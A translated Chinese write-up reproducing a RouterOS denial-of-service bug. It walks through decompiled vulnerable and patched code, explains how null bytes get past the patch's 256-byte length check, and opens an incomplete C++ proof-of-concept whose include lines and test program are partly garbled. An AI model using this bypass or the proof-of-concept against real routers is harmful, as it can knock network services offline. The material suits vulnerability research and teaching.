# MikroTik RouterOS-CVE-2019-13954漏洞复现
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 产品描述：
**MikroTik RouterOS** 是一种 **路由操作系统**
，并通过该软件将标准的PC电脑变成专业路由器，在软件的开发和应用上不断的更新和发展，软件经历了多次更新和改进，使其功能在不断增强和完善。特别在无线、认证、策略路由、带宽控制和防火墙过滤等功能上有着非常突出的功能，其极高的性价比，受到许多网络人士的青睐。RouterOS在具备现有路由系统的大部分功能，能针对网吧、企业、小型ISP接入商、社区等网络设备的接入，基于标准的
**x86构架** 的PC。一台586PC机就可以实现路由功能，提高硬件性能同样也能提高网络的访问速度和吞吐量。完全是一套低成本，高性能的路由器系统。
## 漏洞利用分析：
###  漏洞描述：
根据CVE-2019-13954的漏洞公告中得知，认证的用户可以通过发送一个特殊的POST请求，服务器在处理此请求时会陷入死循环，造成内存耗尽，导致系统的服务瘫痪重启
###  漏洞原理：
CVE-2019-13954的漏洞利用地方跟CVE-2018-1157的类似，都是同一个地方死循环
下面是`6.40.5`，`x86`架构的漏洞文件反汇编代码：从中不难看出，有两个重要的函数决定循环是否能跳出while的死循环，sub_5E9F()和Headers::parseHeaderLine解析后的返回值为非零（即解析失败），因此此处可以利用的点就这两个函数
    int __cdecl JSProxyServlet::doUpload(int a1, int a2, Headers *a3, Headers *a4)
    {
        //    ...
      while ( 1 )
      {
        sub_5E9F(v32, &s1);
        if ( !s1 )
          break;
        string::string((string *)&v41, &s1);
        v14 = Headers::parseHeaderLine((Headers *)&v42, (const string *)&v41);
        string::freeptr((string *)&v41);
        if ( !v14 )    
        {
          string::string((string *)&v41, "");
          Response::sendError(a4, 400, (const string *)&v41);
          string::freeptr((string *)&v41);
    LABEL_56:
          tree_base::clear(v16, v15, &v42, map_node_destr);
          goto LABEL_57;
        }
      }
      //...
    }
问题就出在sub_5E9F函数（读取post请求数据），在getline的时候，如果输入的字节数量大于
    char *__usercall sub_5E9F@(istream *a1@, char *a2@)
    {
      char *v2; // esi
      char *result; // eax
      unsigned int v4; // ecx
      v2 = a2;
      istream::getline(a1, a2, 256u, '\n');
      result = 0;
      v4 = strlen(v2) + 1;
      if ( v4 != 1 )
      {
        result = &v2[v4 - 2];
        if ( *result == 13 )
          *result = 0;
      }
      return result;
    }
下面是`6.42.11`，`x86`架构打了补丁的JSProxyServlet::doUpload，加了一个长度判断是不是0x100个字节
    int __cdecl JSProxyServlet::doUpload(int a1, int a2, Headers *a3, Headers *a4)
    {
    //...
      while ( 1 )
      {
        sub_51F7(v37, &s1);
        if ( !s1 )
          break;
        v14 = -1;
        v15 = &s1;
        do
        {
          if ( !v14 )
            break;
          v16 = *v15++ == 0;
          --v14;
        }
        while ( !v16 );
        if ( v14 != 0x100u )
        {
          v36 = 0;
          string::string((string *)&v46, &s1);
          v17 = Headers::parseHeaderLine((Headers *)&v47, (const string *)&v46);
          string::freeptr((string *)&v46);
          if ( v17 )
            continue;
        }
        string::string((string *)&v46, "");
        Response::sendError(a4, 400, (const string *)&v46);
        string::freeptr((string *)&v46);
    LABEL_60:
        tree_base::clear(v19, v18, &v47, map_node_destr);
        goto LABEL_61;
      }
    //...
    }
相比`6.40.5`版本，6.42.11中sub_51F7的getline还是没有变
    char *__usercall sub_51F7@(istream *a1@, char *a2@)
    {
      char *v2; // esi
      char *result; // eax
      unsigned int v4; // ecx
      v2 = a2;
      istream::getline(a1, a2, 0x100u, '\n');
      result = 0;
      v4 = strlen(v2) + 1;
      if ( v4 != 1 )
      {
        result = &v2[v4 - 2];
        if ( *result == 13 )
          *result = 0;
      }
      return result;
    }
###  POC原理：
利用getline原理
虽然6.42.11的版本中JSProxyServlet::doUpload加入了长度的判断，并且getline是按照\n（getline是按行读取）结束符前取前0x100个字节，但是可以通过构造很多\00来影响整个字符串的长度，getline只会将\n前的0x100个字符读入缓冲区，再会消化掉\n转化为\00，总之getline()会根据参数对输入产生截断，不考虑字符数组的存储空间，先将输入转换为`"xxxx\0"`的格式
当是cin.getline(a, 5)时，输入abcdef，输出是abcd
当是cin.getline(a, 6)时，输入abcdef，输出是abcde
说明getline可能把空行\n转化为字符\0了，然后把\0算入所谓的长度5中了，不信，上汇编
测试代码：（长度改为了6）
    #include 
    #include 
    using namespace std;
    int main(void) {
            char a[5];
          cin.getline(a, 6);
          int b = 5;
          cout 
    #include 
    #include 
    #include 
    #include "jsproxy_session.hpp"
    #include "winbox_message.hpp"
    namespace
    {
        const char s_version[] = "CVE-2019-13954 PoC 1.1.0";
        bool parseCommandLine(int p_argCount, const char* p_argArray[],
                              std::string& p_username, std::string& p_password,
                              std::string& p_ip, std::string& p_port)
        {
            boost::program_options::options_description description("options");
            description.add_options()
            ("help,h", "A list of command line options")
            ("version,v", "Display version information")
            ("username,u", boost::program_options::value(), "The user to log in as")
            ("password", boost::program_options::value(), "The password to log in with")
            ("port,p", boost::program_options::value()->default_value("80"), "The HTTP port to connect to")
            ("ip,i", boost::program_options::value(), "The IPv4 address to connect to");
            boost::program_options::variables_map argv_map;
            try
            {
                boost::program_options::store(
                    boost::program_options::parse_command_line(
                        p_argCount, p_argArray, description), argv_map);